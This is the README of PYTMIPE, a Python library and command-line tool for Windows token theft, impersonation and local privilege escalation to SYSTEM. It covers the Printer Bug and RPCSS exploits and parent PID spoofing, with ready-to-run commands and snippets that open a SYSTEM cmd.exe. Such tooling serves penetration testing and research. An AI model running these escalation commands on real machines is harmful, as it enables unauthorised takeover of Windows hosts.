PYTMIPE
====

__PYTMIPE__ (PYthon library for Token Manipulation and Impersonation for Privilege Escalation) is a Python 3 library for manipulating Windows tokens and managing impersonations in order to gain more privileges on Windows. It implements some exploits for local privilege escalations on Windows (e.g. RPCSS local PE, Printer Bug local PE).

Features
====

* A __python client__: *tmipe* (*python3 tmipe.py*)
* A __python library__: *pytmipe*. Useful for including this project in another one (e.g. *tokenmanager.py*)
* __pytinstaller examples__, for getting __standalones__ exes

Capabilities
====

The following __non-exhaustive__ list shows some features implemented in *pytmipe* library:
* Token and privileges management:
  * get, enable or disable privilege(s) on token for current or remote thread
  * get local or remote token information
  * get effective token for current thread (impersonation or primary token)
* get many information about selected token(s):
  * elevation type, impersonation type, Linked token with details, SID, ACLs, default groups, primary group, owner, privileges, source
  * etc
* __List all tokens which are accessible__ (primary & impersonation tokens) from current thread:
  * 2 different methods implemented: "thread" method and __"handle"__ method (favorite)
  * check if token can be impersonated
  * get information about each token (elevation type, impersonation type, Linked token, SID, etc)
  * get all tokens which are accessible by account name (SID)
* Impersonate a token or user:
  * Make Token and Impersonate (requires credentials of user)
  * Token impersonation/theft (specific privileges are required): impersonate a chosen token
  * Create Process with a token (specific privileges are required): impersonate a chosen token and create new process
  * __Impersonate first *nt authority\system* token__ found
  * impersonate primary token of remote process with pid
* Escalation methods:
  * __Parent PID Spoofing__ - Handle Inheritance
  * Service Manager via direct command or named pipe impersonation: local administrator to *nt authority\system* (or orther privileged account)
  * Task scheduler via direct command or named pipe impersonation: local administrator to *nt authority\system*
  * WMI job via direct command or named pipe impersonation: local administrator to *nt authority\system*
  * __Printer Bug__: *SeImpersonatePrivilege* to *nt authority\system*
  * __RPCSS__: *SeImpersonatePrivilege* to *nt authority\system*
  * __Re enable privileges__ via task scheduling and named pipe impersonation
  
Dependencies
====

*ctypes* is used a maximum of time.
Many features of *pywin32* have been re developped in pytmipe to avoid the use of *pywin32* for better portability.
However, Task Scheduler module still uses *pywin32* (more precisely *pythoncom*) by lack of time.
All other modules uses ctypes only.

HOW TO USE
====

For __python client__ (named *tmipe*):

```console
python.exe tmipe.py -h
usage: tmipe.py [-h] [--version]
                {cangetadmin,printalltokens,printalltokensbyname,printalltokensbypid,printsystemtokens,searchimpfirstsystem,imppid,imptoken,printerbug,rpcss,spoof,impuser,runas,scm}
                ...

                      **
    888888  8b    d8  88  88""Yb  888888
      88    88b  d88  88  88__dP  88__
      88    88YbdP88  88  88"""   88""
      88    88 YY 88  88  88      888888
-------------------------------------------
Token Manipulation, Impersonation and
     Privilege Escalation (Tool)
-------------------------------------------
By Quentin HARDY (quentin.hardy@protonmail.com)

positional arguments:
  {cangetadmin,printalltokens,printalltokensbyname,printalltokensbypid,printsystemtokens,searchimpfirstsystem,imppid,imptoken,printerbug,rpcss,spoof,impuser,runas,scm}

                         Choose a main command
    cangetadmin          Check if user can get admin access
    printalltokens       Print all tokens accessible from current thread
    printalltokensbyname
                         Print all tokens accessible from current thread by account name
    printalltokensbypid  Print all tokens accessible from current thread by pid
    printsystemtokens    Print all system tokens accessible from current
    searchimpfirstsystem
                         search and impersonate first system token
    imppid               impersonate primary token of selected pid and try to spawn cmd.exe
    imptoken             impersonate primary or impersonation token of selected pid/handle and try to spawn cmd.exe
    printerbug           exploit the "printer bug" for getting system shell
    rpcss                exploit "rpcss" for getting system shell
    spoof                parent PID Spoofing ("handle inheritance)"
    impuser              create process with creds with impersonation
    runas                create process with creds as runas
    scm                  create process with Service Control Manager

optional arguments:
  -h, --help             show this help message and exit
  --version              show program's version number and exit
```

For __python library__ (named *pytmipe*), see source code and examples.
Normally, I have well documented the source code...
Most of functions are documented.

For __pyinstaller examples__ and standalones, see files in *src/examples/* folders.

Examples
====

Example 1: get *nt authority\system*
---------

For impersonating the first *system* token and get a cmd.exe prompt as *system* from python client (*tmipe*):
```console
python.exe tmipe.py searchimpfirstsystem -vv
```

For doing the same thing thanks to the *pytmipe* library directly, see the *src/examples/searchAndImpersonateFirstSystemToken.py*:
```python
from impersonate import Impersonate
from utils import configureLogging

configureLogging()
imp = Impersonate()
imp.searchAndImpersonateFirstSystemToken(targetPID=None, printAllTokens=False)
```
It will open a cmd.exe prompt as *system* if the current Windows user has required rights.

Of course, from this source code, you can create a standlone exe with *pyinstaller*.

Example 2: get tokens
---------

For getting primary and impersonation(s) tokens used in current process:
```console
python.exe tmipe.py printalltokens --current --full --linked
```

For getting all tokens which are accessible from current thread, organized by pid, when the impersonation is possible only:
```console
python.exe tmipe.py printalltokensbypid --imp-only
```

Output:
```console
[...]
- PID 4276:
        - S-1-5-18: NT AUTHORITY\SYSTEM (possible imp: True)
- PID 7252:
        - None
- PID 1660:
        - S-1-5-21-28624056-3392308708-440876048-1106: DOMAIN\USER (possible imp: True)
        - S-1-5-20: NT AUTHORITY\NETWORK SERVICE (possible imp: True)
        - S-1-5-18: NT AUTHORITY\SYSTEM (possible imp: True)
        - S-1-5-90-0-1: Window Manager\DWM-1 (possible imp: True)
        - S-1-5-19: NT AUTHORITY\LOCAL SERVICE (possible imp: True)
[...]
```

If you want to do this operation with the *pytmipe* library, it is easy too:
```python
from impersonate import Impersonate
from utils import configureLogging

configureLogging()
imp = Impersonate()
imp.printAllTokensAccessible(targetPID=None, printFull=True, printLinked=True, _useThreadMethod=False)
```

Example 3: impersonate token
---------

You can impersonate a selected token.

First step, get all tokens according to your filters (*system* tokens and tokens which can be impersonated by current thread):
```console
python.exe tmipe.py printalltokens --filter {\"sid\":\"S-1-5-18\",\"canimpersonate\":true}
```

Output:
```console
[...]
- PID: 2288
------------------------------
  - PID: 2288
  - type: Impersonation (2)
  - token: 2504
  - ihandle: 118
  - sid: S-1-5-18
  - accountname: {'Name': 'SYSTEM', 'Domain': 'NT AUTHORITY', 'type': 1}
  - intlvl: System
  - owner: S-1-5-18
  - issystem: True
  - elevationtype: Default (1)
  - iselevated: True
  - linkedtoken: None
  - implevel: Impersonate (2)
  - appcontainertoken: False
  [...]
  - primarysidgroup: S-1-5-18
  - isrestricted: False
  - hasrestricitions: True
  - Mandatory Policy: VALID_MASK
  - canimpersonate: True
[...]
```

This previous output shows an impersonation token located in the pid 2288, which has an integrity level *system*.
It is possible to impersonate this specific token with the following command:
```console
python.exe tmipe.py imptoken --pid 2288 --ihandle 118 -vv
```

This previous command opens a cmd.exe as *nt authority\system*.


Donation
====
If you want to support my work doing a donation, I will appreciate a lot:

Via BTC: 36FugL6SnFrFfbVXRPcJATK9GsXEY6mJbf
